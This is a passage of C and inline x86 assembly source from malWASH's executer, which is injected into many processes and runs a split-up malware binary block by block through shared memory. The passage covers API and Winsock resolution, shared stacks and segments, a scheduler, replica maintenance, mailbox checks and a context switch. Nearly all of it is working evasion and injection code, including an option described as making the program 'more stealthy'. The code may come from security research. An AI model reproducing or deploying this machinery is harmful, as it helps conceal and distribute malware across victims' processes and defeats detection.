			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__CreateProcessW]				// arg1: & of "CreateProcessW"
			call	getprocaddr							// fastcall calling convention
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_CreateProcessW], eax// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__GetStartupInfoW]			// arg1: & of "GetStartupInfoW"
			call	getprocaddr							// fastcall calling convention
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_GetStartupInfoW],eax// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__CreateFileA]				// arg1: & of "CreateFileA"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[CreateFileA], eax			// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__WriteFile]					// arg1: & of "WriteFile"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[WriteFile], eax			// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__SetFilePointer]				// arg1: & of "SetFilePointer"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[SetFilePointer], eax		// set function pointer
			cmp		eax, 0xffffffff						// error?
			jne		main_initfp_ok						// in case of no error, skip error handling
														//
		main_initfp_error:								// function pointer initialization error
			mov		edi, ERROR_GETPROCADDR_1			// set possible error code
			jmp		main_error							// jump to error handling
														//
		main_initfp_ok:									//
			// --------------------------------------------------------------------------
			// allocate memory for local variables in heap (too big for stack)
			// --------------------------------------------------------------------------
			mov		esi, MAXNBLKS						// we need an array of ÌÁ×NBLKS entries
			shl		esi, 2								// each entry is pointer (4 bytes)
														//
			push	esi									// arg2: dwBytes
			push	dword ptr 0x00						// arg1: dwFlags (no special flags)
			call	[LocalAlloc]						// allocate space for block
			mov		edi, ERROR_LOCALALLOC_FAILED		// set possible error code
			test	eax, eax							// NULL returned?
			jz		main_closenerror					// if yes, exit
			mov		[blkaddr], eax						// this memory is for blkaddr pointer
														//
			push	esi									// arg2: dwBytes (esi doesn't change)
			push	dword ptr 0x00						// arg1: dwFlags (no special flags)
			call	[LocalAlloc]						// allocate space for block
			mov		edi, ERROR_LOCALALLOC_FAILED		// set possible error code
			test	eax, eax							// NULL returned?
			jz		main_closenerror					// if yes, exit
			mov		[blkoff], eax						// this memory is for blkoff pointer
			// --------------------------------------------------------------------------
			// attach shared stack to current thread
			// --------------------------------------------------------------------------
			mov		ecx, NMAXTHREADS					// for each thread
			mov		esi, STACKBASEADDR					// start stacks from this address
			lea		ebx, [shstack]						// address of shared stack name
		alloc_stack_loop:								//
			push	ecx									// backup counter
			push	esi									// load stack at this address
			mov		ecx, ebx							// address of shared stack name
			mov		edx, STACKSIZE						// and its size
			call	attachreg							// attach!
			pop		ecx									// restore counter
			mov		edi, ERROR_ATTACHSHSTACK			// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			add		ebx, 13								// strlen("SharedStack1") = 12 + 1 for NULL
			add		esi, STACKSIZE						// go to the next slot
			add		esi, 0x20000						// add some space between stacks 
														// thus we prevent overflows from 1 stack to another
			loop	alloc_stack_loop					// allocate next stack
			// --------------------------------------------------------------------------
			// attach const_detour region  to current thread
			// --------------------------------------------------------------------------
			push	DUPDETOURADDR						// we want to load it at this address
			lea		ecx, [detournam]					// address of detour region name
			mov		edx, 0x1000							// 4K seem more than enough :) (can't be too small)
			call	attachreg							// attach!
			mov		edi, ERROR_ATTACHDETOUR				// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			je		main_error							// attachreg (take care of possible open handle)										
														//
			mov		edi, DUPDETOURADDR					// go the detour
			mov		dword ptr[edi], DUPDETOURADDR+4		// use the fisrt 4 bytes as a pointer for the next 4
			// --------------------------------------------------------------------------
			// now copy const_detour() code there
			// --------------------------------------------------------------------------
			add		edi, 4								// skip 1st pointer
			call	get_const_detour_addr				// get address of const_detour
			mov		esi, eax							// source: const_detour()
			mov		ecx, 0x80							// byte 128 they're fine. If they're more no problem
			rep		movsb								// copy funtion to shared region
			je		main_error							// attachreg (take care of possible open handle)	
			// --------------------------------------------------------------------------
			// find library functions that are not on kernel32.dll (ws2_32.dll)
			// --------------------------------------------------------------------------
			lea		eax,	[msvcrt]					// eax = & of msvcrt.dll
			push	eax									// arg1: "msvcrt.dll"
			call	[LoadLibraryA]						// Load module to memory
			push	eax									// backup module handle
														//
			lea		esi, [__printf]						// esi = & of printf string
			push	esi									// arg2: "printf"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			mov		[myprintf], eax						// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			lea		eax,	[user32]					// eax = & of user32.dll
			push	eax									// arg1: "user32.dll"
			call	[LoadLibraryA]						// Load module to memory
			push	eax									// backup module handle
														//
			lea		esi, [__PeekMessageA]				// esi = & of PeekMessageA string
			push	esi									// arg2: "PeekMessageA"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			mov		[PeekMessageA], eax					// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			lea		eax,	[ws2_32]					// eax = & of ws2_32.dll
			push	eax									// arg1: "ws2_32.dll"
			call	[LoadLibraryA]						// Load module to memory
			push	eax									// backup module handle
														//
			lea		esi, [__WSAStartup]					// esi = & of WSAStartupA string
			push	esi									// arg2: "WSAStartupA"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			mov		[WSAStartup], eax					// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			mov		eax, [esp]							// eax gets module handle again
			lea		esi, [__WSADuplicateSocketA]		// esi = & of WSADuplicateSocketA string
			push	esi									// arg2: "WSADuplicateSocketA"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
														//
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_WSADuplicateSocketA], eax	// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			mov		eax, [esp]							// eax gets module handle again
			lea		esi, [__WSASocketA]					// esi = & of WSASocketA string
			push	esi									// arg2: "WSASocketA"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			mov		[WSASocketA], eax					// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			mov		eax, [esp]							// eax gets module handle again
			lea		esi, [__closesocket]				// esi = & of closesocket string
			push	esi									// arg2: "closesocket"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			mov		[closesocket], eax					// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			mov		eax, [esp]							// eax gets module handle again
			lea		esi, [__bind]						// esi = & of bind string
			push	esi									// arg2: "bind()"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_bind], eax			// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			mov		eax, [esp]							// eax gets module handle again
			lea		esi, [__listen]						// esi = & of bind string
			push	esi									// arg2: "listen()"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_listen], eax		// save address
			test	eax, eax							// error returned?
			je		main_initfp_2_error					// abort
														//
			mov		eax, [esp]							// eax gets module handle again
			lea		esi, [__accept]						// esi = & of bind string
			push	esi									// arg2: "accept()"
			push	eax									// arg1: module handle
			call	[GetProcAddress]					// Find function address
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_accept], eax		// save address
			test	eax, eax							// error returned?
			jne		main_initfp_2_ok					// in case of no error, skip error handling
														//
		main_initfp_2_error:							// module handle is on stack, leave it there
			mov		edi, ERROR_GETPROCADDR_2			// set possible error code
			jmp		main_error							// jump to error handling
		main_initfp_2_ok:								//
			pop		eax									// restore handle
			// --------------------------------------------------------------------------
			// attach shared control region to current thread
			// --------------------------------------------------------------------------
			push	0x0									// we don't have any address preference
			lea		ecx, [ctrlnam]						// address of shared control name
			mov		edx, SIZE shctrl_t					// and its size
			call	attachreg							// attach!
			mov		edi, ERROR_ATTACHSHCTRL				// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			je		main_error							// attachreg (take care of possible open handle)
														//
			mov		dword ptr [hCtrlFile], edx			// store handle
			mov		dword ptr [loctrl], eax				// store ctrl pointer
			call	loctrl_backup_wrt					// store eax in loctrl in local storage
			// --------------------------------------------------------------------------
			// attach shared segments to current thread
			// --------------------------------------------------------------------------
			mov		ebx, [loctrl]						// ebx = loctrl
			movzx	ecx, word ptr[ebx + NSEGMSOFF]		// ecx = loctrl->nsegms
		segmload_loop:									//
			push	ecx									// backup counter	
			dec		ecx									// adjust ecx to the prev element of segm table
			// --------------------------------------------------------------------------
			// calculate base address for each segment:
			// We have a predefined baseaddress, and each segment 
			// --------------------------------------------------------------------------
	}
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_3_LOAD_SEGMS_IN_PREDEFINED_ADDR__			// load segment in predefined addresses
	__asm {
			imul	eax, ecx, SEGMNXTOFF				// 
			add		eax, SEGMBASEADDR					// eax = base_addr + segm_off * i
			push	eax									// that's the base address
	}													//
#else
	// WARNING: This may cause problems with global pointers! 
	//			See Variation definition for a detailed explanation
	__asm { push	0 }									// load segment in any RVA
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
	__asm {
			shl		ecx, 4								// sizeof(segm_t) = 16
			mov		edx, dword ptr[ebx+ecx+ SEGMOFFEND]	// edx =  loctrl->segm[ecx].endEA -
			sub		edx, dword ptr[ebx+ecx+ SEGMOFFSTR]	//		  loctrl->segm[ecx].startEA
			lea		ecx, [ebx + ecx + SEGMOFFNAM]		// ecx = &loctrl->segm[ecx].name
			call	attachreg							// attach!
			pop		ecx									// restore counter
														//
			mov		edi, ERROR_SEGMLOAD					// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			je		main_closenerror					// attachreg fail (took care of possible open handle)
														//
			lea		esi, dword ptr[segmptr]				// get segment table
			lea		esi, [esi + ecx*8 - 8]				// find current index -> sizeof(segmptr_t) = 8
			mov		dword ptr [esi], eax				// store ctrl pointer
			mov		dword ptr [esi + 4], edx			// store handle
														//
			loop	segmload_loop						// load next segment
			// --------------------------------------------------------------------------
			// create semaphores
			// --------------------------------------------------------------------------
			mov		ecx, NMAXTHREADS					// for each thread
		create_sem_loop:								//
			push	ecx									// backup counter
			lea		eax, [ctrlsem]						// get address of ctrlsem string
			shl		ecx, 4								// each name is 16 characters long
			lea		eax, [eax + ecx - 16]				// get next semaphore name
			push	eax									// arg4: lpName
			push	1									// arg3: lMaximumCount,
			push	1									// arg2: lInitialCount
			push	0									// arg1: lpSemaphoreAttributes
			call	[CreateSemaphoreA]					// create/open semaphore
			pop		ecx									// restore counter
			mov		edi, ERROR_SEMCREATE				// set possible error code
			cmp		eax, 0x00							// NULL returned?
			je		main_closenerror					// if so, jump to error
			mov		[sem + ecx*4 - 4], eax				// save semaphore handle
			loop	create_sem_loop						// create next semaphore
			// --------------------------------------------------------------------------
			//  find process handle, pid and pid index in pidtab (we need it for dup* operations)
			// --------------------------------------------------------------------------
			lea		ecx, [__GetCurrentProcessId]						// arg1: & of "GetCurrentProcessId"
			call	getprocaddr							// fastcall calling convention
			mov		edi, ERROR_GETPROCADDR_1			// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			je		main_closenerror					// if yes go to error
														// (don't store it's address, as we won't use it anymore)
			call	eax									// get pid
			call	get_noebp_local_storage_esi			// locate local storage
			lea		ebx, ds:[esi + noebp_pid]			// OPTIONAL: store pid
			mov		[ebx], eax							//
														//
			lea		esi, [loctrl]						// esi = &loctrl
			mov		esi, [esi]							// esi = loctrl
			mov		ecx, [esi + NPROCOFF]				// ecx = loctrl->nproc (#processes)
														//
		pidtab_loop:									// as long as we run this code, there's >=1 process :)
			lea		ebx, [esi + PIDTABOFF + ecx*4 - 4]	// ebx = &pid[i] (i starts from the end)
			cmp		eax, [ebx]							// pid[i] == PID ?
			je		pid_found							// if yes break
			loop	pidtab_loop							// else i--, and go back
														//
			mov		edi, ERROR_PID_NOT_FOUND			// set possible error code													
			jmp		main_closenerror					// pid not found. Abort
		pid_found:										//
			dec		ecx									// adjust ecx
			call	get_noebp_local_storage_esi			// locate local storage
			lea		esi, ds:[esi + noebp_pididx]		// esi = &noebp_pididx
			mov		[esi], ecx							// save pid index
	}
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_1_PRELOAD_BLOCKS__							// preload blocks if variation 1 is set
	__asm {
			mov		ecx, [loctrl]						// ecx = &loctrl
			movzx	ecx, word ptr [ecx + NBLKSOFF]		// ecx = loctrl->nblks = i
														//
		preload_next_block:								//
			// --------------------------------------------------------------------------
			// load block's shared region
			// --------------------------------------------------------------------------
			mov		eax, [loctrl]						// eax = &loctrl
			push	ecx									// backup ecx
			push	0x0									// we don't have any address preference
			lea		ecx, [eax + BLKOFF + ecx*8]			// ecx = loctrl->blk[i] = address of next 
														//		block shared region name
			mov		edx, MAXBLKSIZE						// and its size
			call	attachreg							// attach!		
			mov		edi, ERROR_ATTACHBLK				// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			je		main_closenerror					// attachreg (took care of possible open handle)	
			// --------------------------------------------------------------------------
			// copy block from shared region to heap
			// --------------------------------------------------------------------------
			push	edx									// temporary store shared block pointer
			push	eax									// and the open handle
														//
			push	MAXBLKSIZE							// arg2: dwBytes
			push	dword ptr 0x00						// arg1: dwFlags (no special flags)
			call	[LocalAlloc]						// allocate space for block
			mov		edi, ERROR_LOCALALLOC_FAILED		// set possible error code
			test	eax, eax							// NULL returned?
			jz		main_closenerror					// if yes, exit
														//
			mov		ecx, [esp + 8]						// restore ecx (note that esp will be different if
														// an error occured, but no problem)
			mov		esi, [blkaddr]						// esi = &blkaddr
			lea		edi, [esi + ecx*4]					// edi = blkaddr[i]
			mov		[edi], eax							// blkaddr[i] = blk address in heap
														//
			// we cannot make changes to shared block, because block relocations are specific to each process
			mov		edi, eax							// edi (src) = shared block to copy
			mov		esi, [esp]							// esi (dst) = copy block to heap
			mov		ecx, MAXBLKSIZE						// set block size
			cld											// clear DF (++ mode)
			rep movsb									// copy block
			// --------------------------------------------------------------------------
			// do block relocations
			// --------------------------------------------------------------------------
			mov		ecx, eax							//
			call	block_prolog						// do block relocations in heap
			mov		edi, eax							// copy possible error code
			test	eax, 0x80000000						// error?
			jnz		main_closenerror					// if so, return
														//
			mov		ecx, [esp + 8]						// get a backup of ecx, without removing it from stack
			mov		esi, [blkoff]						// esi = &blkoff
			lea		edi, [esi + ecx*4]					// edi = blkoff[i]
			mov		[edi], eax							// store block offset
														//
			// note that the arguments for these functions are the pushed edx and eax ;)
			call	[UnmapViewOfFile]					// unload shared control region
			call	[CloseHandle]						// CloseHandle()	
														//
			pop		ecx									// restore counter
			dec		ecx									// decrease
			jnz		preload_next_block					// we cannot use loop as the offset is >128 bytes
			// loop	preload_next_block					// attach to the next block
	}
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
		
	// -----------------------------------------------------------------------------------------------------
	// Initialization phase finished. Now we enter in the main loop
	// ------------------------------------------------------------------------------------------------------
	__asm {
		load_next_block:								// jump here to load next block 
														// (we're in an infinity loop)
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_4_SLEEP_BETWEEN_BLK_EXEC__
			// --------------------------------------------------------------------------
			// you can sleep for a little now, to make program more stealthy
			//
			// From Sleep() manual: A value of zero causes the thread to relinquish the 
			// remainder of its time slice to any other thread that is ready to run. If 
			// there are no other threads ready to run, the function returns immediately, 
			// and the thread continues execution.
			// ---------------------------------------------------------------------------
			push	0x00								// arg1: dwMilliseconds = 0
			call	[Sleep]								// Sleep for a while
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
			// --------------------------------------------------------------------------
			// check if current program is closing. Don't leave open semaphores
			// --------------------------------------------------------------------------
				push 	0x0000							// arg5: wRemoveMsg (PM_NOREMOVE)
				push	0								// arg4: wMsgFilterMax
				push	0								// arg3: wMsgFilterMin
				push	0								// arg2: hWnd (NULL)
				lea		eax, [msg]						// 
				push	eax								// arg1: lpMsg
				call	[PeekMessageA]					// PeekMessage()
				test	eax, eax						// message available?
				je		no_message						// if PeekMessage() = 0, no message is available
														//
				lea		ebx, [msg]						// ebx = &msg
				mov		bx, word ptr[ebx + 0x4]			// bx  = msg.message
				cmp		bx, 0x0012						// msg.message == WM_QUIT ?
				je		main_finalize					// if yes, exit
														//
				cmp		bx, 0x0002						// msg.message == WM_DESTROY ?
				je		main_finalize					// if yes, exit
														//
				cmp		bx, 0x0010						// msg.message == WM_CLOSE ?
				je		main_finalize					// if yes, exit
														//
		no_message:										//
			// --------------------------------------------------------------------------
			// before everything you can check if all malWASH instances are alive
			// --------------------------------------------------------------------------
			call	maintain_chk						// maintain replicas 
			// --------------------------------------------------------------------------
			// it's time for our scheduler. See function resched() for more details
			// --------------------------------------------------------------------------
			call	resched								// call scheduler
			mov		edi, ERROR_SCHEDULER_INFLOOP		// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			je		main_closenerror					// handle error and exit
			// at this point, you're allowed to execute next block
			// --------------------------------------------------------------------------
			// check your mailbox
			// --------------------------------------------------------------------------
			call	mailboxchk							// check your mailbox for any jobs
			mov		edi, eax							// set possible error code
			test	eax, 0xff000000						// error returned?
			jne		main_closenerror					// attachreg (took care of possible open handle)		
	}  
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_7_ENABLE_SPINS__
	//-------------------------------------------------------------------------------------------------------
	// About Spins
	//
	// There's a very weird and rare scenario: Imagine that a malware opens, closes and reopens a file/
	// socket. If we inject code in many processes (>7) it's possible the first process attempt to reopen 
	// the file while  the last process hasn't close it yet. As you can imagine, the reopen will fail. In 
	// case that malware opens the file with Share Mode we may not have problems. Otherwise we must ensure 
	// that all processes will close the file before the first process will try to reopen it. 
	//
	// Upon CloseHandle/closesocket, all processes enter in a spin. In spin mode a process doesn't execute 
	// any block; it just check its mailbox and performs it's maintenance check then blocks on semaphore
	// again. If spin is long enough then all processes (with very high probability) will gain execution 
	// (and thus check mailbox => close the open HANDLE/SOCKET) before the next process tries to re-open
	// the file.
	//-------------------------------------------------------------------------------------------------------

	if( --loctrl->spin >= 0 )							// if we have more rounds to spin
		__asm { jmp	skip_block_exec	}					// skip block execution
		
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_8_ENABLE_DEBUG_CHECKS__
	
	// This is a very useful tool for debugging. Because we execute malware block by block, if
	// program crash we know which block has the problem. With this code, we can force a specific
	// process to execute a specific block. Thus we can attach this process to a debugger and insect
	// the error	
	if( 
		//	loctrl->nxtblk[nxtthrd] == 30 ||
		//	loctrl->nxtblk[nxtthrd] == 28 ||
		//	loctrl->nxtblk[nxtthrd] == 53 ||
		0 )												// something dummy
	{													// if we're going to execute a specific block
		__asm {
			call	get_noebp_local_storage_esi			// get local storage
			mov		edx, ds:[esi + noebp_pididx]		// get process's index in pidtab
														//
			cmp		edx, 9								// if it doesn't match with our specific process
			jnz		skip_block_exec						// skip block execution
														//
			int 3										// cause an interrupt
		}
	}

	// or you can add simpler things...
	if( loctrl->nxtblk[nxtthrd] == 12 )
	{
		__asm { nop };
	//	__asm { int 3 };
	}

#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_6_DISPLAY_VERBOSE_INFO__
 
	// print next block information
	myprintf( fmtstr, nxtthrd, loctrl->nxtblk[nxtthrd] );
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_9_TRACE_BLOCKS__
	/* 
	 * If you want to count the distinct blocks that get executed, append each block to a file
	 * and then use this python code to count them:
	 *
	 * #!/usr/bin/env python2
	 * import struct
	 * import sys
	 * import os
	 * 
	 * if __name__ == "__main__":
	 *		visited = {}
	 *		file = open('C:\\Users\\ispo\\Desktop\\malwash_exec\\blks.log')
	 *
	 *		file.readline()							# skip  "* * * ... * * *"
	 *		for line in file.readlines():			# for the rest of the lines				
	 * 			visited[ int(line) ] = 1 
	 *		
	 *		print 'Total blocks:', len( visited )
	 *			
	 *		exit(0)
	 */

	// Use this code (Runs only under Visual Studio), to log blocks:
	FILE *fp = fopen( "blks.log", "a+" );
	fprintf( fp, "%d\t%3d\n", nxtthrd, loctrl->nxtblk[nxtthrd] );
	fclose( fp );
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifndef __VAR_1_PRELOAD_BLOCKS__						// if we are not preload blocks, load next block

	ptrnam = loctrl->blk[loctrl->nxtblk].name;			// use some C to make things easier
	
	__asm {
			mov		[fptabcnt], 0x00					// clear function pointer table
			// --------------------------------------------------------------------------
			// attach next block shared region to our thread
			// --------------------------------------------------------------------------
			mov		ecx, dword ptr[ptrnam]				// address of next block shared region name
			mov		edx, MAXBLKSIZE						// and its size
			push	0									// load it in any address
			call	attachreg							// attach!		
			mov		edi, ERROR_ATTACHBLK				// set possible error code
			cmp		eax, 0xffffffff						// error returned?
			je		main_closenerror					// attachreg (took care of possible open handle)										
			mov		dword ptr [blk2], eax				// store ctrl pointer
			mov		dword ptr [hBlkFile], edx			// store handle
			// --------------------------------------------------------------------------
			// do block relocations
			// --------------------------------------------------------------------------
			mov		ecx, [blk2]							// adress of the shared block
			call	block_prolog						// do block relocations in heap
			mov		edi, eax							// copy possible error code
			test	eax, 0x80000000						// error?
			jnz		main_closenerror					// if so, return
			mov		dword ptr [blk], eax				// store ctrl pointer
	}
#else 
			// get next of next thread (if 1 thread exists, simply get next block)
			blk = (byte*) blkoff[loctrl->nxtblk[nxtthrd]];
#endif
	__asm {

//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_1_PRELOAD_BLOCKS__						// if we are not preload blocks, load next block
	
			// --------------------------------------------------------------------------
			// copy block from shared region to blk_entry_point
			// blocks are copied from heap, which is not +X, or
			// are copied from shared region, where we don't want to make any changes to them
			// --------------------------------------------------------------------------
			mov		ebx, [blk]							// 
			movzx	ecx, word ptr[ebx - 2]				// ecx = actual block size
			lea		esi, [ebx]							// esi = actual block opcodes
			
			call	find_blk_entry_point				// we need a trick here to get the address of 
														// blk_entry_point
			mov		edi, eax							// eax = blk_entry_point
			// If we try to directly refer blk_entry_point, we'll get it's absolute address, which make
			// code not being PIE.
			// lea		edi, [blk_entry_point]			// edi = &blk_entry_point
			cld											// clear DF (++ mode)
			rep		movsb								// copy block
			// --------------------------------------------------------------------------
			// fill the gap between unused block bytes and exec epilog (context switch)
			// we have 2 options:
			//	[1]. Fill the rest of the block with NOP
			//	[2]. Append at the bottom an instruction jmp +(MAXBLKSIZE - ebx - 5) to
			//		 skip the rest of the block (+5 because jmp 0x11223344 is 5 bytes long)
			//
			// We can use both methods here, it's fine.
			//
			// NOTE: I don't think that 1st method will have any performance impact :))
			// --------------------------------------------------------------------------
			// method [2] (Note that we can also do this in splitting step)
			// --------------------------------------------------------------------------
			mov		ecx, MAXBLKSIZE						// first 3 instructions are common in both methods
			movzx	eax, word ptr[ebx - 2]				// 
			sub		ecx, eax							// 
			sub		ecx, 5								// jmp +0x176 = e9 76 01 00 00 -> 5 bytes long
			mov		byte ptr[edi], 0xe9					// set up opcode
			inc		edi									// move pointer
			mov		dword ptr[edi], ecx					// write offset
			add		edi, 4								// adjust edi (for method 1 later)
			// --------------------------------------------------------------------------
			// method [1]
			// --------------------------------------------------------------------------
			mov		ecx, MAXBLKSIZE						// get maximum block size
			movzx	eax, word ptr[ebx - 2]				// ecx = actual block size
			sub		ecx, eax							// find the block size left
														//
			sub		ecx, 6								// use this ONLY if you used method 2 before
			mov		eax, 0xff							// NOP opcode = 0x90
			cld											// clear direction flag -> increment edi
			rep		stosb								// fill the rest with nops
			// --------------------------------------------------------------------------
			// restore error code
			// --------------------------------------------------------------------------
			push	[lasterror]							// get last error
			call	[SetLastError]						// set error code
#else
			// --------------------------------------------------------------------------
			// detach current block shared region from our thread
			// --------------------------------------------------------------------------						
			push	[blk2]								// block pointer to stack
			call	[UnmapViewOfFile]					// UnmapViewOfFile()
														//
			push	[hBlkFile]							// block handle on stack
			call	[CloseHandle]						// CloseHandle()
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
	}
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
	// -----------------------------------------------------------------------------------------------------
	// do the context switch (exec prolog)
	//
	// NOTE: Upon epilog, ebp will point somewhere in the shared stack and thus will be different. Thus ANY
	//	references to local variables will be invalid. This means that we'll not be able to access loctrl, 
	//	to restore the context. Any local variable won't be accessible and we're not allowed to use global
	//	variables. 
	//	However we can do a nasty trick: We'll mix data withing code. Code labels will be intact during
	//	context switch. Thus, we're going to leave some space between code and  we'll store loctrl and the 
	//	old context there.
	//	
	//	Note that we don't really want to restore the whole context. Restoring esp and ebp is enough. eip
	//	will get the right value, because function epilog, is right after block.
	//	
	//	Finally, we're going to store loctrl, esp and ebp. loctrl is useless but we add it to show how
	//	crucial is this pointer.
	// -----------------------------------------------------------------------------------------------------
	__asm {
			jmp	skip_exec_prolog_noebp_decls			// skip the code below
			// --------------------------------------------------------------------------
			// we need some storage space here to store the old context (actually, storing esp and
			// ebp is enough). We can't use the stack, so we can define a label, and use it as a
			// reference:
			//		ebp_backup:										// store ebp here
			//			D(0x00, 0x00, 0x00, 0x00)					// reserve 4 bytes
			// and then we can store data in it as follows:
			//			mov		ds:[ebp_backup], ebp				// of ebp and
			//
			// That's absolutely correct. The only problem is that it won't work when we inject
			// the code in another process. The reason is that when we store data in it, we use
			// its abosulte address. This means that if we load the executer() in different base
			// address, we'll still referring to ebp_backup, with the absolute address of the 
			// previous base address. In other words, we convert our code to not-PIE.
			// 
			// The trick we're doing below, is to referencing ebp_backup in an "relative way"
			// --------------------------------------------------------------------------	
		get_exec_local_storage:							// save here loctrl pointer
 			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction			
			pop		eax									// get current address
			lea		eax, [eax + 0x5]					// our value is 20 bytes below
			retn										// return
														//
			D(0x00, 0x00, 0x00, 0x00)					// LOCAL STORAGE: reserve 4 bytes for ebp
			D(0x00, 0x00, 0x00, 0x00)					// 4 bytes for esp
			D(0x00, 0x00, 0x00, 0x00)					// and 4 bytes for current's thread context
			D(0x00, 0x00, 0x00, 0x00)					// and 4 bytes for current's thread context
#define ebp_backup 0x00									// define ebp_backup as offset in the 
#define esp_backup 0x04									// above tiny local storage
#define thd_backup 0x08									// 
#define off_backup 0x0c									// 
														//
		skip_exec_prolog_noebp_decls:					//
			call	get_exec_local_storage				// get local storage
			mov		ds:[eax + ebp_backup], ebp			// backup ebp and
			mov		ds:[eax + esp_backup], esp			//  esp
														//			
			mov		ebx, [nxtthrd]						// get next thread id			
			mov		ds:[eax + thd_backup], ebx			// don't forget to store context offset
														//
			imul	ebx, ebx, CTXLEN					// get next context entry
			mov		ds:[eax + off_backup], ebx			// store context offset (we need it for epilog)
			mov		eax, [loctrl]						// eax = &loctrl
			lea		eax, [eax + ebx + CTXOFF]			// eax = loctrl->ctx[nxtthrd]
			// --------------------------------------------------------------------------
			// every process will have stack loaded in different virtual address. Thus
			// we have to store only the relative offset from the beginning of the stack
			// to esp and ebp. Upon exec prolog we add the base address of the stack to
			// these registers and upon exec epilog we subtract it.
			// --------------------------------------------------------------------------	
			// mov		ebx, [loctrl]					//  
			// add		ebx, STACKOFF					// find stack RVA
			// add		[eax + CTXOFF_ESP], ebx			// make esp and ebp point to the absolute
			// add		[eax + CTXOFF_EBP], ebx			// addresses of the stack
